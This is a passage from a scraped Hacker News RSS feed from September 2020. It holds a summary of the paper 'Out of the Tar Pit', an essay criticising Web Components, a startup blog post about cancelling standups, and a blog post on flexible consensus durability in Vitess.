Complexity is the root cause of the vast majority of problems with software today. Unreliability,
late delivery, lack of security ‚Äî often even poor performance in large-scale systems can all be
seen as deriving ultimately from unmanageable complexity.</blockquote>
<p>By complexity, the authors mean "that which makes large systems <em>hard to understand</em>," not the
field of computer science that is concerned with the resources that are consumed by an algorithm.</p>
</div>
<div id="approaches-to-understanding">
<h2>Approaches to Understanding</h2>
<p>To better establish their definition of complexity, the authors explore the ways in which
developers attempt to understand a system. There are two main ways:</p>
<ol>
<li>
<strong>Testing</strong> This is a way to understand the system from the outside.</li>
<li>
<strong>Informal Reasoning</strong> This is a way to understand the system from the inside.</li>
</ol>
<blockquote>
Of the two, informal reasoning is the most important by far. This is because ‚Äî as we shall see
below ‚Äî there are inherent limits to what can be achieved by testing, and because informal
reasoning (by virtue of being an inherent part of the development process) is always used.  The
other justification is that improvements in informal reasoning will lead to less errors being
created whilst all that improvements in testing can do is to lead to more errors being detected.</blockquote>
<p>The primary problem with testing is that a test will only tell you about the behavior of a system
subject to the particular range of inputs used by the test. A test will tell you absolutely nothing
about the system's behavior under a different set of inputs. In large systems, the set of all
possible inputs is too large to fully explore with testing.</p>
<blockquote>
Have you performed the right tests? The only certain answer you will ever get to this question is
an answer in the negative ‚Äî when the system breaks.</blockquote>
<p>Informal reasoning, on the other hand, is what is used when a developer builds a mental model about
how the system works while looking at the code. Because it is the most important way to understand
a system, simplicity is a vital characteristic of well-functioning, large-scale systems.</p>
</div>
<div id="causes-of-complexity">
<h2>Causes of Complexity</h2>
<div id="state">
<h3>State</h3>
<p>The presence of state (particularly mutable state) makes programs difficult to understand. The
authors offer the following example to explain the problems of state:</p>
<blockquote>
Anyone who has ever telephoned a support desk for a software system and been told to ‚Äútry it
again‚Äù, or ‚Äúreload the document‚Äù, or ‚Äúrestart the program‚Äù, or ‚Äúreboot your computer‚Äù or
‚Äúre-install the program‚Äù or even ‚Äúre-install the operating system and then the program‚Äù has
direct experience of the problems that state causes for writing reliable, understandable
software.</blockquote>
<p>State makes testing difficult by making flakiness more likely. (Flakiness describes a set of tests
that randomly fail for seemingly no reason.) This fact, combined with the large number of inputs to
a program, combine together <em>horribly</em> (emphasis the authors).</p>
<p>In addition, state complicates informal reasoning by hindering the developer from understanding the
system "from the inside." It contaminates a system in the sense that even mostly stateless systems
become difficult to understand when coupled to components with mutable state.</p>
</div>
<div id="control">
<h3>Control</h3>
<p>The authors claim that the next most important barrier to understanding is control.</p>
<blockquote>
Control is basically about the order in which things happen. The problem with control is that
very often we do not want to have to be concerned with this.</blockquote>
<p>Complexity caused by control very much depends on the choice of language; some languages make
control flow explicit, whereas other, more declarative languages, make control flow
implicit. Having to explicitly deal with control creates complexity.</p>
<p>The same is true of concurrency. Explicit concurrency in particular makes both testing and informal
reasoning about programs hard.</p>
</div>
<div id="code-volume">
<h3>Code volume</h3>
<p>Increasing the amount of code does increase complexity, but effective management of state and
control marginalizes its impact.</p>
<p>There are indeed other causes of complexity than the three listed above, but they all reduce to
three basic principles:</p>
<ol>
<li>Complexity breeds complexity</li>
<li>Simplicity is <em>hard</em>
</li>
<li>Power corrupts</li>
</ol>
<p>The last principle states that mistakes and poor decisions <em>will be made</em> when a language allows
it. For this reason, restrictive, declarative languages and tools should be preferred.</p>
</div>
</div>
<div id="classical-approaches-to-managing-complexity">
<h2>Classical approaches to managing complexity</h2>
<p>To better understand the ways in which programmers manage complexity, the authors explore three
major styles of programming:</p>
<ol>
<li>Imperative (more precisely, object-oriented)</li>
<li>Functional</li>
<li>Logic</li>
</ol>
<div id="object-orientation">
<h3>Object-orientation</h3>
<p>Object-oriented programming (OOP) is one of the most dominant styles of programming today for
computers that are based on the von Neumann architecture and is presumably inspired largely by its
state-based form of computation.</p>
<p>OOP enforces integrity constraints on data by combining an object's state with a set of procedures
to access and modify it. This characteristic is known as <em>encapsulation</em>. Problems may arise when
multiple procedures contend for access to the same state.</p>
<p>OOP also views objects as being uniquely identifiable, regardless of the object's attributes. In
other words, two objects with the exact same set of attributes and values are condsidered
distinct. This property is known as <em>intensional identity</em> and contrasts with <em>extensional
identity</em> in which things are considered the same if their attributes are the same.</p>
<p>For these two reasons, OOP is not suitable for avoiding the problems of complexity:</p>
<blockquote>
The bottom line is that all forms of OOP rely on state (contained within objects) and in general
all behaviour is affected by this state. As a result of this, OOP suffers directly from the
problems associated with state described above, and as such we believe that it does not provide
an adequate foundation for avoiding complexity.</blockquote>
</div>
<div id="functional-programming">
<h3>Functional programming</h3>
<p>Modern functional programming (FP) languages can be classified as pure (e.g. Haskell) and impure
(e.g. the ML family of languages).</p>
<blockquote>
<p>The primary strength of functional programming is that by avoiding state (and side-effects) the
entire system gains the property of <em>referential transparency</em> - which implies that when supplied
with a given set of arguments a function will always return exactly the same result (speaking
loosely we could say that it will always behave in the same way)...</p>
<p>It is this cast iron guarantee of <em>referential transparency</em> that obliterates one of the two
crucial weaknesses of testing as discussed above. As a result, even though the other weakness of
testing remains (testing for one set of inputs says nothing at all about behaviour with another
set of inputs), testing does become far more effective if a system has been developed in a
functional style.</p>
</blockquote>
<p>Informal reasoning is also more effective in the functional approach to programming. By enforcing
<em>referential transparency</em>, mutable state is generally avoided. However, in spite of its
properties, nothing in FP can prevent somenone from effectively simulating multiple state, so some
care must still be taken.</p>
<p>The authors concede that by sacrificing state in FP, one does lose a degree of modularity.</p>
<blockquote>
Working within a stateful framework it is possible to add state to any component without
adjusting the components which invoke it. Working within a functional framework the same effect
can only be achieved by adjusting every single component that invokes it to carry the additional
information around.</blockquote>
<p>However,</p>
<blockquote>
The trade-off is between complexity (with the ability to take a shortcut when making some
specific types of change) and simplicity (with huge improvements in both testing and
reasoning). As with the discipline of (static) typing, it is trading a one-off up-front cost for
continuing future gains and safety (‚Äúone-off‚Äù because each piece of code is written once but is
read, reasoned about and tested on a continuing basis).</blockquote>
<p>FP remains relatively unpopular despite its advantages. The authors state that the reason is that
problems arise when programmers attempt to use it in problems that require mutable state.</p>
</div>
<div id="logic-programming">
<h3>Logic programming</h3>
<p>Logic programming is like FP in the sense that it is declarative: it emphasizes what needs to be
done, not how it is done. The primary example of a logic programming language is Prolog.</p>
<blockquote>
Pure logic programming is the approach of doing nothing more than making statements about the
problem (and desired solutions). This is done by stating a set of axioms which describe the
problem and the attributes required of something for it to be considered a solution. The ideal of
logic programming is that there should be an infrastructure which can take the raw axioms and use
them to find or check solutions. All solutions are formal logical consequences of the axioms
supplied, and ‚Äúrunning‚Äù the system is equivalent to the construction of a formal proof of each
solution.</blockquote>
<p>Pure logic programming does not suffer from the same problems of state and control as OOP. However,
it appears that real logic programming languages need to make some pragmatic tradeoffs in their
implementations which introducs small amounts of state and ‚Ä¶</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/">http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/</a></em></p>]]>
            </description>
            <link>http://kmdouglass.github.io/posts/summary-out-of-the-tar-pit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581591</guid>
            <pubDate>Thu, 24 Sep 2020 18:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Programming with Categories (Online Book Draft) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581521">thread link</a>) | @909832
<br/>
September 24, 2020 | http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf | <a href="https://web.archive.org/web/*/http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://brendanfong.com/programmingcats_files/cats4progs-DRAFT.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581521</guid>
            <pubDate>Thu, 24 Sep 2020 18:04:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The failed promise of Web Components]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581439">thread link</a>) | @headalgorithm
<br/>
September 24, 2020 | https://lea.verou.me/2020/09/the-failed-promise-of-web-components/ | <a href="https://web.archive.org/web/*/https://lea.verou.me/2020/09/the-failed-promise-of-web-components/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Web Components had so much potential to empower HTML to do more, and make web development more accessible to non-programmers and easier for programmers. Remember how exciting it was every time we got new shiny HTML elements that actually <em>do stuff</em>? Remember how exciting it was to be able to do sliders, color pickers, dialogs, disclosure widgets straight in the HTML, without having to include any widget libraries?</p>



<p>The promise of Web Components was that we‚Äôd get this convenience, but for a much wider range of HTML elements, developed much faster, as nobody needs to wait for the full spec + implementation process. We‚Äôd just include a script, and boom, we have more elements at our disposal!</p>



<p>Or, that was the idea. Somewhere along the way, the space got flooded by JS frameworks aficionados, who revel in complex APIs, overengineered build processes and dependency graphs that look like the roots of a banyan tree.</p>



<figure><img src="https://live.staticflickr.com/2025/32441377780_e3acf6de12_b.jpg" alt=""><figcaption>This is what the roots of a Banyan tree look like. <a href="https://www.flickr.com/photos/79721788@N00/32441377780/">Photo by David Stanley on Flickr (CC-BY)</a>. </figcaption></figure>



<p>Perusing the components on <a href="https://www.webcomponents.org/">webcomponents.org</a> fills me with anxiety, and I‚Äôm perfectly comfortable writing JS ‚Äî I write JS for a living! What hope do those who can‚Äôt write JS have? Using a custom element from the directory often needs to be preceded by a ritual of npm flugelhorn, import clownshoes, build quux, all completely unapologetically because ‚Äúhere is my truckload of dependencies, yeah, what‚Äù. Many steps are even omitted, likely because they are ‚Äúobvious‚Äù. Often, you wade through the maze only to find the component doesn‚Äôt work anymore, or is not fit for your purpose.</p>



<p>Besides setup, the main problem is that HTML is not treated with the appropriate respect in the design of these components. They are not designed as closely as possible to standard HTML elements, but <em>expect</em> JS to be written for them to do anything. HTML is simply treated as a shorthand, or worse, as merely a marker to indicate where the element goes in the DOM, with all parameters passed in via JS. I recall <a href="https://adactio.com/articles/12839#webcomponents">a wonderful talk by Jeremy Keith</a> a few years ago about this very phenomenon, where he discussed <a href="https://shop.polymer-project.org/">this e-shop Web components demo by Google</a>, which is the poster child of this practice. These are the entire contents of its <code>&lt;body&gt;</code> element:</p>



<pre><code>&lt;body&gt;
	&lt;shop-app unresolved=""&gt;SHOP&lt;/shop-app&gt;
	&lt;script src="node_assets/@webcomponents/webcomponentsjs/webcomponents-loader.js"&gt;&lt;/script&gt;
	&lt;script type="module" src="src/shop-app.js"&gt;&lt;/script&gt;
	&lt;script&gt;window.performance&amp;&amp;performance.mark&amp;&amp;performance.mark("index.html");&lt;/script&gt;
&lt;/body&gt;</code></pre>



<p>If this is how Google is leading the way, how can we hope for contributors to design components that follow established HTML conventions?</p>



<p>Jeremy criticized this practice from the aspect of backwards compatibility: when JS is broken or not enabled, or the browser doesn‚Äôt support Web Components, the entire website is blank. While this is indeed a serious concern, my primary concern is one of <strong>usability</strong>: <strong>HTML is a lower barrier to entry language</strong>. Far more people can write HTML than JS. Even for those who do eventually write JS, it often comes after spending years writing HTML &amp; CSS.</p>



<p>If components are designed in a way that requires  JS, this excludes thousands of people from using them. And even for those who <em>can</em> write JS, HTML is often easier: you don‚Äôt see many people rolling their own sliders or using JS-based ones once <code>&lt;input type="range"&gt;</code> became widely supported, right?</p>



<p>Even when JS is unavoidable, it‚Äôs not black and white. A well designed HTML element can reduce the amount and complexity of JS needed to a minimum. Think of the <code><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dialog">&lt;dialog&gt;</a></code> element: it usually does require *some* JS, but it‚Äôs usually rather simple JS. Similarly, the <code>&lt;video&gt;</code> element is perfectly usable just by writing HTML, and has a comprehensive JS API for anyone who wants to do fancy custom things.</p>



<p>The other day I was looking for a simple, dependency free, tabs component. You know, the canonical example of something that is easy to do with Web Components, the example 50% of tutorials mention. I didn‚Äôt even care what it looked like, it was for a testing interface. I just wanted something that is small and works like a normal HTML element. Yet, it proved so hard I ended up writing my own!</p>



<h3>Can we fix this?</h3>



<p>I‚Äôm not sure if this is a design issue, or a documentation issue. Perhaps for many of these web components, there are easier ways to use them. Perhaps there are vanilla web components out there that I just can‚Äôt find. Perhaps I‚Äôm looking in the wrong place and there is another directory somewhere with different goals and a different target audience. </p>



<p>But if not, and if I‚Äôm not alone in feeling this way, we need a directory of web components with strict inclusion criteria:</p>



<ul><li><strong>Plug and play.</strong> No dependencies, no setup beyond including one <code>&lt;script&gt;</code> tag. If a dependency is absolutely <em>needed</em> (e.g. in a map component it doesn‚Äôt make sense to draw your own maps), the component loads it automatically if it‚Äôs not already loaded.</li><li>Syntax and API follows <a href="https://www.smashingmagazine.com/2017/02/designing-html-apis/"><strong>conventions established by built-in HTML elements</strong></a> and anything that <em>can</em> be done without the component user writing JS, <em>is</em> doable without JS, per <a href="https://www.w3.org/2001/tag/doc/leastPower.html">the W3C principle of least power</a>.</li><li><strong>Accessible by default</strong> via sensible ARIA defaults, just like normal HTML elements.</li><li><strong>Themable</strong> via <code><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::part">::part()</a></code>, selective inheritance and custom properties. Very minimal style by default. Normal CSS properties should just ‚Äúwork‚Äù to the the extent possible.</li><li><strong>Only one component of a given type</strong> in the directory, that is <strong>flexible</strong> and <strong>extensible</strong> and continuously iterated on and improved by the community. Not 30 different sliders and 15 different tabs that users have to wade through. No branding, no silos of ‚Äúcomponent libraries‚Äù. Only elements that are designed as closely as possible to what a browser would implement in every way the current technology allows.</li></ul>



<p>I would be up for working on this if others feel the same way, since that is not a project for one person to tackle. <em>Who‚Äôs with me?</em></p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://lea.verou.me/2020/09/the-failed-promise-of-web-components/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581439</guid>
            <pubDate>Thu, 24 Sep 2020 17:58:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Routines of Substitution: John von Neumann‚Äôs Work on Software Development,1945‚Äì8]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581433">thread link</a>) | @bindidwodtj
<br/>
September 24, 2020 | https://book4you.org/book/3661323/79ef12 | <a href="https://web.archive.org/web/*/https://book4you.org/book/3661323/79ef12">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://book4you.org/book/3661323/79ef12</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581433</guid>
            <pubDate>Thu, 24 Sep 2020 17:58:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We cancelled standups and let the team build]]>
            </title>
            <description>
<![CDATA[
Score 211 | Comments 252 (<a href="https://news.ycombinator.com/item?id=24581360">thread link</a>) | @thellimist
<br/>
September 24, 2020 | https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened | <a href="https://web.archive.org/web/*/https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-w-id="0ea0c8ae-8333-a516-8908-f86a85ef9373"><p>üëã I'm Julian, the Cofounder of <a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a>. We're building dashboards and alerts that plug into Github - helping engineering leaders build happier, healthier, more productive teams. </p><p>We wanted to share a quick story on why "we cancelled standups and just let the team build". </p><p>It's not as crazy as it sounds so let's dive an and see what happened..</p><p>‚Äç</p><h2>So.. why did we do this?</h2><p>‚Äç</p><h4>At first we were doing great</h4><p>At first the team was moving at (what seemed to be) the speed of light. We were handling issues, fixing bugs, launching features. We even tackled our biggest, nagging pieces of technical debt. Dream come true, right? As a team of technical founders, we patted ourselves on the back for a job well done. It felt like we couldn't be stopped.</p><p>‚Äç</p><h4>But things quickly turned around on us..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f593cc6238ba8f66e10c539_Screenshot_2020-09-08_at_10.22.47_PM.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>And we noticed an odd pattern happening daily..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc18e8a5d4f630d45d4f2_2.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>We brought this data to the team and uncovered a few issues.. Here are some notes from our retro</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6ccdaf16b35490656f58c6_retro-summary.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h2>So.. What did we do?</h2><p>‚Äç</p><h4>We asked for suggestions. Here are the results..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd0bbf86c9040f44cc92b_retro-votes.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>Top Votes:&nbsp;</h4><ol start="" role="list"><li>Cancel Standup</li><li>Work on 'Fun Projects'</li></ol><p>‚Äç</p><p>Might seem crazy but we like to empower the team to improve themselves. &nbsp;We take pride in our ability to iterate our process as often as possible. </p><p>Plus we've got Haystack to see if our changes are working.</p><p>So why not?&nbsp;Let's try it for a week. Revert back if it isn't working out.</p><p>‚Äç</p><h2>We cancelled standup and let the team 'just build'.</h2><p>‚Äç</p><h4>We did agree on some ground rules though..</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd49e16b35472506f74b8_fun-sprint-etiquette.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>And with those rules in place we were off üí®üö£‚Äç‚ôÄÔ∏è</h4><p>Without hesitation we kicked off. Very surprised to see how many 'fun projects' the team already had in mind. It didn't take much prompting at all.</p><p>‚Äç</p><h2>And.. We had our most productive week EVER:</h2><p>‚Äç</p><h4>We recovered our Throughput!</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc209c0fe2df87e4583c0_3.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>Improved our Cycle Time (reversing the trend)!</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc20f1523b25682b1fe92_4.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>Got our 'deep work' back.</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc2169b6b491e6744cd11_5.png" loading="lazy" alt=""></p><figcaption>Source:&nbsp;<a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a></figcaption></figure><p>‚Äç</p><h4>And tackled projects we've wanted to do for MONTHS.</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc2313f047785e14bf727_11.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><h4>Most Importantly..We DECREASED BURNOUT</h4><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cd71016b35499cd6f7f8d_before.png" loading="lazy" alt=""></p></figure><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f6cc24b1523b2af6fb20099_13.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><p>‚Äç</p><h2>It was a HUGE success.</h2><p>The experiment went better than we could have hoped. By removing standups and letting the team work on new, exciting projects we were able to get out of the funk we found ourselves in. Without skipping a beat our team is refreshed, recovered, and excited.</p><p>‚Äç</p><p>‚Äç</p><h2>Does this mean no more stand-ups or roadmaps?</h2><p>Well.. No. But we are considering it. </p><p>‚Äç</p><p>We'll continue to experiment until we find the right balance. Today, we do 2-3 in-person standups per week with async standups on Slack the other days. We carefully document our work in Notion everyday and have Weekly Kick-Off meetings every Monday.</p><p>‚Äç</p><p>The new process is working well so far - plus we have Haystack to help us check-in and make changes if needed.</p><p>‚Äç</p><p>‚Äç</p><h2>So.. how often do YOU experiment with process?</h2><p>The 'right' process is a constantly moving target. What works one day might not work the next. It's important to empower your team to make changes when necessary and improve their day-to-day experience. </p><p>‚Äç</p><p>If you want to experiment like a mad man(woman) on your process. AGGRESSIVELY enable improvement. Empower your team to improve their own work environment - then come check out <a href="https://www.usehaystack.io/?utm_source=Blog&amp;utm_medium=internal%20link&amp;utm_campaign=image%20source">Haystack</a> and we'll show you how to implement a culture of continuous improvement.</p><p>‚Äç</p><p>Either way, hope our story got your wheels turning!</p><p>‚Äç</p><p>‚Äç</p><p>‚Äç</p><figure><p><img src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5123c19bb423a1492c778d_Haystack_Designed_Presentation.png" loading="lazy" alt=""></p></figure><p><a href="https://usehaystack.io/?utm_source=blog&amp;utm_medium=subscription-sequence&amp;utm_campaign=3-ways-to-identify-blockers">Haystack</a> helps engineering leaders identify blockers and trends. Instead of guessing if you're improving, or constantly bothering your team for progress updates, simply use Haystack to get insights in your inbox every morning. Plus a dashboard to track improvements over time.</p><p>‚Äç</p><p><a href="https://usehaystack.io/?utm_source=blog&amp;utm_medium=subscription-sequence&amp;utm_campaign=3-ways-to-identify-blockers">Try it for free</a></p><p>‚Äç</p></div></div>]]>
            </description>
            <link>https://www.usehaystack.io/blog/we-cancelled-standups-and-let-the-team-build-heres-what-happened</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581360</guid>
            <pubDate>Thu, 24 Sep 2020 17:52:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Take the test: your 'tech debt credit score']]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581144">thread link</a>) | @euirqe
<br/>
September 24, 2020 | https://www.stepsize.com/tech-debt-credit-score-test | <a href="https://web.archive.org/web/*/https://www.stepsize.com/tech-debt-credit-score-test">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.stepsize.com/tech-debt-credit-score-test</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581144</guid>
            <pubDate>Thu, 24 Sep 2020 17:33:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consensus Algorithms at Scale ‚Äì Part 3]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24581091">thread link</a>) | @sougou
<br/>
September 24, 2020 | https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases | <a href="https://web.archive.org/web/*/https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><figure id="w-node-9c5fe811ec3e-ca993012"><p><img src="https://assets-global.website-files.com/5ef5a4d4da0d67ccda9b5588/5f6bda6f1d50dc20271ab64d_part3-07.png" loading="lazy" alt=""></p></figure><p><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-1"><em>Consensus Algorithms at Scale - Part 1 <br>‚Äç</em></a><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-2"><em>Consensus Algorithms at Scale - Part 2</em></a></p><h2>Recap</h2><p>Here is a recap of what we covered in the last blog:</p><ul role="list"><li>Durability is the main reason why we want to use a consensus system.</li><li>Since Durability is use-case dependent, we made it an abstract requirement requiring the consensus algorithms to assume nothing about the durability requirements.</li><li>We started off with the original properties of a consensus system as defined by <a href="https://en.wikipedia.org/wiki/Paxos_(computer_science)">Paxos</a> and modified it to make it usable in practical scenarios: instead of converging on a value, we changed the system to accept a series of requests.</li><li>We narrowed our scope down to single leader systems.</li><li>We came up with a new set of rules that are agnostic of durability. The essential claim is that a system that follows these rules will be able to satisfy the requirements of a consensus system. Specifically, we excluded some requirements like majority quorum that have previously been used as core building blocks in consensus algorithms.</li></ul><h2>Consensus Use Cases</h2><p>If there was no need to worry about a majority quorum, we would have the flexibility to deploy any number of nodes we require. We can designate any subset of those nodes to be eligible leaders, and we can make durability decisions without being influenced by the above two decisions. This is exactly what many users have done with <a href="https://vitess.io/">Vitess</a>. The following use cases are loosely derived from real production workloads:</p><ul role="list"><li>We have a large number of replicas spread over many data centers. Of these, we have fifteen leader capable nodes spread over three data centers. We don‚Äôt expect two nodes to go down at the same time. Network partitions can happen, but only between two data centers; a data center will never be totally isolated. A data center can be taken down for planned maintenance.</li><li>We have four zones with one node in each zone. Any node can fail. A zone can go down without notice. A partition can happen between any two zones.</li><li>We have six nodes spread over three zones. Any node can fail. A zone can go down without notice. A partition can happen between any two zones.</li><li>We have two regions, each region has two zones. We don‚Äôt expect more than one zone to go down. A region can be taken down for maintenance, in which case we want to proactively transfer writes to the other region.</li></ul><p>I have not seen anyone ask for a durability requirement of more than two nodes. But this may be due to difficulties dealing with corner cases that MySQL introduces due to its semi-sync behavior. On the other hand, these settings have served the users well so far. So, why become more conservative?</p><p>These configurations are all uncomfortable for a majority based consensus system. More importantly, these flexibilities will encourage users to experiment with even more creative combinations and allow them to achieve better trade-offs.</p><h2>Reasoning about Flexible Consensus</h2><p>The configurations in the previous section seem to be all over the place. How do we design a system that satisfies all of them, and how do we future-proof ourselves against newer requirements?</p><p>There is a way to reason about why this flexibility is possible. This is because the two cooperating algorithms (Request and Election) share a common view of the durability requirements, but can otherwise operate independently.</p><p>For example, let us consider the five node system. If a user does not expect more than one node to fail at any given time, then they would specify their durability requirement as two nodes.</p><p>The leader can use this constraint to make requests durable: as soon as the data has reached one other node, it has become durable. We can return success to the client.</p><p>On the election side, if there is a failure, we know that no more than one node could have failed. This means that four nodes will be reachable. At least one of those will have the data for all successful requests. This will allow the election process to propagate that data to other nodes and continue accepting new requests after a new leader is elected.</p><p>In other words, a single durability constraint dictates both sides of the behavior; if we can find a formal way to describe the requirements, then a request has to fulfil those requirements. On the other hand, an election needs to reach enough nodes to intersect with the same requirements.</p><figure id="w-node-f2e13589f425-ca993012"><p><img src="https://assets-global.website-files.com/5ef5a4d4da0d67ccda9b5588/5f6bdb8ae991420d4c1c808f_request-election-01.jpg" loading="lazy" alt=""></p></figure><p>For example, if durability is achieved with 2/5 nodes, then the election algorithm needs to reach 4/5 nodes to intersect with the durability criteria. In the case of a majority quorum, both of these are 3/5. But our generalization will work for any arbitrary property.</p><h2>Worst Case Scenario</h2><p>In the above five node case, if two nodes fail, the failure tolerance has been exceeded. We can only reach three nodes. If we don‚Äôt know about the state of the other two nodes, we will have to assume the worst case scenario that a durable request could have been accepted by the two unreachable nodes. This will cause the election process to stall.</p><p>If this were to happen, the system has to allow for a compromise: abandon the two nodes and move forward. Otherwise, the loss of availability may become more expensive than the potential loss of that data.</p><h2>Practical Balance</h2><p>A two-node durability does not always mean that the system will stall or lose data. A very specific sequence of failures have to happen:</p><ul role="list"><li>Leader accepts a request</li><li>Leader attempts to send the request to multiple recipients</li><li>Only one recipient receives and acknowledges the request</li><li>Leader returns a success to the client</li><li>Both the leader and that recipient crash</li></ul><p>This type of failure can happen if the leader and the recipient node are network partitioned from the rest of the cluster. We can mitigate this failure by requiring the ackers to live across network boundaries.</p><p>The likelihood of a replica node in one cell failing after an acknowledgment, and a master node failing in the other cell after returning success, is much lower. This failure mode is rare enough that many users treat this level of risk as acceptable.</p><h2>Orders of Magnitude</h2><p>The most common operation performed by a consensus system is the completion of requests. In contrast, a leader election generally happens in two cases: taking nodes down for maintenance, or upon failure.</p><p>Even in a dynamic cloud environment like Kubernetes, it would be surprising to see more than one election per day for a cluster, whereas such a system could be serving hundreds of requests per second. That amounts to many orders of magnitude in difference between a request being fulfilled and a leader election.</p><p>This means that we must do whatever it takes to fine tune the part that executes requests, whereas leader elections can be more elaborate and slower. This is the reason why we have a bias towards reducing the durability settings to the bare minimum. Expanding this number can adversely affect performance, especially the tail latency.</p><p>At <a href="https://youtube.com/">YouTube</a>, although the quorum size was big, a single ack from a replica was sufficient for a request to be deemed completed. On the other hand, the leader election process had to chase down all possible nodes that could have acknowledged the last transaction. We did consciously trade off on the number of ackers to avoid going on a total wild goose chase.</p><p>In the next blog, we will take a short detour. Shlomi Noach will talk about how some of these approaches work with MySQL and semi-sync replication. Following this, we will continue pushing forward on the implementation details of these algorithms.</p><p>‚Äç</p><p><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-1"><em>Consensus Algorithms at Scale - Part 1 <br>‚Äç</em></a><em>Read </em><a href="https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-2"><em>Consensus Algorithms at Scale - Part 2</em></a></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.planetscale.com/blog/blog-series-consensus-algorithms-at-scale-part-3-use-cases</link>
            <guid isPermaLink="false">hacker-news-small-sites-24581091</guid>
            <pubDate>Thu, 24 Sep 2020 17:29:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two and a half years of building products]]>
            </title>
            <description>
<![CDATA[
